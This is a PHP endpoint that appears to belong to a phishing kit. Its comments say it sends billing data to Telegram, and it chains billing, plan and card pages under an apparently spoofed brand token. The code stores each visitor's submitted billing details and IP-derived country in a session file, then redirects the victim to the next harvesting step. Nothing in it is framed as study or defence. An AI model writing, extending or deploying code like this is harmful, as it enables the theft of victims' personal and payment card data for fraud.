<?php
// SEND BILLING DATA TO TELEGRAM
require_once(__DIR__ . '/../config.php');
require_once(__DIR__ . '/../includes/get-country.php');

header('Content-Type: application/json');

$input = json_decode(file_get_contents('php://input'), true);
$token = $input['token'] ?? '';
$data = $input['data'] ?? [];

if (empty($token)) {
    echo json_encode(['success' => false]);
    exit;
}

// Get IP and country
$ip = $_SERVER['REMOTE_ADDR'];
$country = getCountryFromIP($ip);
$shortId = substr($token, 3); // Get all chars after SPT/TKN

// Save billing data to session storage for card API (NO TELEGRAM MESSAGE)
$sessions = file_exists(SESSION_FILE) ? json_decode(file_get_contents(SESSION_FILE), true) : [];
$sessions[$token] = $data;
file_put_contents(SESSION_FILE, json_encode($sessions));

// No Telegram message - just save data for card
$result = ['ok' => true];

// Auto-redirect to plan page WITH TOKEN (billing → plan → card)
echo json_encode([
    'success' => $result['ok'],
    'redirect' => './plan.php?token=' . urlencode($token)
]);
?>
